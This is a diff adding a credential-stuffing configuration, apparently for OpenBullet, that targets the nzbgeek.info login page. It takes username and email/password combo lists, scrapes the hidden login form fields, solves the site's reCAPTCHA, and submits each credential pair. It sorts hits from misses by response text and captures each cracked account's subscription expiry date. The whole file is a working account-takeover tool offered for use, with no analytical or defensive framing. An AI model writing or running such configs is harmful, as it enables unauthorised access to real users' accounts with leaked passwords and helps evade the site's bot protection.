@@ -1,0 +1,60 @@
+[SETTINGS]
+{
+  "Name": "NZB Geek",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-27T09:43:13.8847089+00:00",
+  "AdditionalInfo": "",
+  "Author": "B1rdY",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN REQUEST GET "https://nzbgeek.info/member.php" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#ACTION PARSE "<SOURCE>" CSS "[name=action]" "value" 0 -> VAR "ACTION" "" "" 
+#PARSE_URL PARSE "<SOURCE>" CSS "[name=url]" "value" 0 -> VAR "URL" "" "" 
+#REMEMBER PARSE "<SOURCE>" CSS "[name=remember]" "value" 0 -> VAR "REMEMBER" "" "" 
+#SUBMIT PARSE "<SOURCE>" CSS "[name=submit]" "value" 0 -> VAR "SUBMIT" "" "" 
+RECAPTCHA "https://nzbgeek.info/index.php" "6Lcm6AETAAAAAGt8LQHpMB3yiM8Ixm3AMdrt79r2" -> VAR "RECAPTCHA" 
+#POST REQUEST POST "https://nzbgeek.info/member.php" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&g-recaptcha-response=<RECAPTCHA>&action=<ACTION>&url=<URL>&remember=<REMEMBER>&submit=<SUBMIT>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://nzbgeek.info/index.php" 
+  HEADER "Origin: https://nzbgeek.info" 
+  HEADER "Host: nzbgeek.info" 
+#KEYS KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "index.php" 
+    KEY "You will now be taken back to where you came from" 
+  KEYCHAIN Failure OR 
+    KEY "Please correct the following errors before continuing:" 
+#GET REQUEST GET "https://nzbgeek.info/geekseek.php?profile" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://nzbgeek.info/index.php" 
+  HEADER "Host: nzbgeek.info" 
+#EXPIRE PARSE "<SOURCE>" CSS "#profile1 > table > tbody > tr:nth-child(4) > td > table > tbody > tr > td:nth-child(3) > font:nth-child(7) > b" "innerHTML" 0 -> CAP "EXPIRE" "" "" 
